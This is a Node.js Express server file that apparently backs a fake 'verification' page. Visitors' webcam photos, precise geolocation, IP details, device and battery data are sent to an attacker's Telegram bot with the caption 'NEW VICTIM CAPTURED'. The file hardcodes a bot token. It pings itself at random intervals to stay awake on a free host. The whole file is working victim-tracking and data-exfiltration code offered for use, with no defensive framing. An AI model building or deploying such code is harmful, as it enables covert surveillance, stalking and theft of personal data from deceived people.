const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
// Serve static files
app.use(express.static(__dirname));

// Serve the dashboard
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Serve the pinger
app.get('/pinger', (req, res) => {
  res.sendFile(path.join(__dirname, 'pinger.html'));
});

// Telegram Bot configuration
const BOT_TOKEN = '8159189472:AAEsEP1Ngxi6wHBLyvU97XlzbSJIVzJk18E';
let CHAT_ID = '';

// Function to get chat ID
async function getChatId(botToken) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const data = await response.json();
    
    if (data.ok && data.result && data.result.length > 0) {
      for (const update of data.result) {
        if (update.message && update.message.chat && update.message.chat.id) {
          return update.message.chat.id;
        }
      }
    }
    return null;
  } catch (error) {
    console.error('Error getting chat ID:', error);
    return null;
  }
}

// Route for the home page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Health check endpoint for monitoring services
app.get('/health', (req, res) => {
  res.status(200).send({
    status: 'UP',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    failedPings: failedPingCount
  });
});

// Alternative keep-alive endpoint that can be pinged from external services
app.get('/ping', (req, res) => {
  console.log(`External ping received from ${req.ip}`);
  res.status(200).send('OK');
});

// Route to handle image submission and user data
app.post('/save.php', async (req, res) => {
  try {
    if (!req.body.image) {
      return res.status(400).send('No image data received');
    }

    // Process the image data
    let imageData = req.body.image;
    imageData = imageData.replace(/^data:image\/jpeg;base64,/, '');
    imageData = imageData.replace(/ /g, '+');
    
    // Parse user data if available
    let userData = {};
    try {
      if (req.body.userData) {
        userData = JSON.parse(req.body.userData);
      }
    } catch (err) {
      console.error('Error parsing user data:', err);
    }
    
    // Convert base64 to buffer
    const buffer = Buffer.from(imageData, 'base64');
    
    // Generate a temporary file name
    const tempFileName = `temp_${Date.now()}.jpg`;
    const tempFilePath = path.join(__dirname, tempFileName);
    
    // Save the file temporarily
    fs.writeFileSync(tempFilePath, buffer);
    
    // Get IP and other information
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const dateTime = new Date().toISOString();
    
    // Create detailed caption with all collected data
    let caption = `📸 *NEW VICTIM CAPTURED*\n\n`;
    
    // Add basic info
    caption += `⏰ *Time:* ${dateTime}\n`;
    caption += `📱 *IP:* ${ip}\n`;
    
    // Add username if available
    if (userData.username) {
      caption += `👤 *Username:* ${userData.username}\n`;
    }
    
    // Add location data if available
    if (userData.location) {
      caption += `\n📍 *LOCATION:*\n`;
      caption += `- Latitude: ${userData.location.latitude}\n`;
      caption += `- Longitude: ${userData.location.longitude}\n`;
      caption += `- Accuracy: ${userData.location.accuracy}m\n`;
      
      // Add Maps link
      const mapsLink = `https://www.google.com/maps?q=${userData.location.latitude},${userData.location.longitude}`;
      caption += `- Maps: ${mapsLink}\n`;
    }
    
    // Add IP info if available
    if (userData.ipInfo) {
      caption += `\n🌐 *IP INFO:*\n`;
      caption += `- City: ${userData.ipInfo.city || 'Unknown'}\n`;
      caption += `- Region: ${userData.ipInfo.region || 'Unknown'}\n`;
      caption += `- Country: ${userData.ipInfo.country || 'Unknown'}\n`;
      caption += `- ISP: ${userData.ipInfo.org || 'Unknown'}\n`;
    }
    
    // Add device info
    caption += `\n� *DEVICE INFO:*\n`;
    caption += `- UA: ${userData.userAgent || userAgent}\n`;
    caption += `- Platform: ${userData.platform || 'Unknown'}\n`;
    caption += `- Screen: ${userData.screenSize || 'Unknown'}\n`;
    caption += `- Language: ${userData.language || 'Unknown'}\n`;
    caption += `- Timezone: ${userData.timezone || 'Unknown'}\n`;
    
    // Add permissions info
    caption += `\n🔐 *PERMISSIONS:*\n`;
    caption += `- Notifications: ${userData.notificationPermission || 'Unknown'}\n`;
    caption += `- Camera: Granted\n`;
    caption += `- Location: ${userData.location ? 'Granted' : 'Denied'}\n`;
    caption += `- Microphone: ${userData.microphoneAccess || 'Unknown'}\n`;
    
    // Additional info
    if (userData.battery) {
      caption += `\n🔋 *Battery:* ${userData.battery.level * 100}% (${userData.battery.charging ? 'Charging' : 'Not Charging'})\n`;
    }
    
    if (userData.network) {
      caption += `\n📶 *Network:* ${userData.network.type} (${userData.network.downlink}Mbps)\n`;
    }
    
    // Limit the caption size to prevent Telegram API errors (max 1024 characters)
    if (caption.length > 1000) {
      caption = caption.substring(0, 1000) + '...';
    }
    
    // Get chat ID if not already set
    if (!CHAT_ID) {
      CHAT_ID = await getChatId(BOT_TOKEN);
      if (!CHAT_ID) {
        // Clean up
        fs.unlinkSync(tempFilePath);
        return res.status(500).send("Error: Couldn't determine chat ID. Please send a message to the bot first.");
      }
    }
    
    // First send photo
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', caption);
    formData.append('photo', fs.createReadStream(tempFilePath));
    formData.append('parse_mode', 'Markdown');
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });
    
    const result = await response.json();
    
    // Send additional data as a document if available
    if (Object.keys(userData).length > 0) {
      try {
        // Create detailed JSON file with all user data
        const jsonFileName = `userData_${Date.now()}.json`;
        const jsonFilePath = path.join(__dirname, jsonFileName);
        fs.writeFileSync(jsonFilePath, JSON.stringify(userData, null, 2));
        
        // Send as document to Telegram
        const docFormData = new FormData();
        docFormData.append('chat_id', CHAT_ID);
        docFormData.append('document', fs.createReadStream(jsonFilePath));
        docFormData.append('caption', '📊 Complete victim data in JSON format');
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: docFormData,
        });
        
        // Clean up JSON file
        fs.unlinkSync(jsonFilePath);
      } catch (err) {
        console.error('Error sending user data document:', err);
      }
    }
    
    // Clean up the temporary file
    fs.unlinkSync(tempFilePath);
    
    if (result.ok) {
      res.send('Verification successful!');
    } else {
      res.status(500).send('Verification failed. Please try again.');
    }
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('An error occurred during processing.');
  }
});

// Add keep-alive functionality to prevent service from sleeping
const PING_INTERVAL = 2 * 60 * 1000; // 2 minutes (increased frequency)
let serviceUrl = '';
let failedPingCount = 0;
let pingTimer = null;

// Function to keep the service alive by pinging itself
async function keepAlive() {
  if (!serviceUrl) {
    console.log('Service URL not set yet, skipping ping');
    return;
  }
  
  console.log(`[${new Date().toISOString()}] Pinging service to keep alive: ${serviceUrl}/health`);
  
  try {
    const response = await fetch(`${serviceUrl}/health`);
    console.log(`Ping successful: ${response.status}`);
    
    // Reset fail counter on success
    failedPingCount = 0;
  } catch (err) {
    console.error('Ping failed:', err);
    
    // Track failed pings
    failedPingCount++;
    
    // If we've failed too many times, try to restart the keep-alive mechanism
    if (failedPingCount >= 5) {
      console.log('Multiple ping failures detected. Attempting recovery...');
      
      // Restart the ping mechanism
      if (pingTimer) {
        clearInterval(pingTimer);
      }
      pingTimer = setInterval(keepAlive, PING_INTERVAL);
      failedPingCount = 0;
    }
  }
}

// Start the server
const server = app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  console.log(`Visit http://localhost:${PORT} to view the application`);
  
  // Determine the service URL (for pinging)
  const host = process.env.RENDER_EXTERNAL_URL || 
               process.env.RENDER_EXTERNAL_HOSTNAME || 
               `http://localhost:${PORT}`;
  
  serviceUrl = host.startsWith('http') ? host : `https://${host}`;
  console.log(`Service URL set to: ${serviceUrl}`);
  
  // Start the keep-alive mechanism
  pingTimer = setInterval(keepAlive, PING_INTERVAL);
  
  // Extra aggressive pinging - Random intervals between 30-90 seconds
  // This creates unpredictable ping patterns that are harder for the system to optimize out
  function scheduleRandomPing() {
    const randomInterval = Math.floor(Math.random() * (90000 - 30000)) + 30000; // 30-90 seconds
    setTimeout(() => {
      try {
        console.log(`[${new Date().toISOString()}] Random interval ping (${randomInterval}ms)`);
        fetch(`${serviceUrl}/ping?random=true`)
          .then(() => console.log('Random ping successful'))
          .catch(err => console.error('Random ping failed:', err));
      } finally {
        scheduleRandomPing(); // Schedule next ping regardless of success/failure
      }
    }, randomInterval);
  }
  
  // Start the random ping mechanism
  scheduleRandomPing();
});

// Handle server errors
server.on('error', (error) => {
  console.error('Server error:', error);
});

// Handle process errors and prevent crashes
process.on('uncaughtException', (error) => {
  console.error('Uncaught exception:', error);
  // Log error but don't exit
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled rejection at:', promise, 'reason:', reason);
  // Log error but don't exit
});
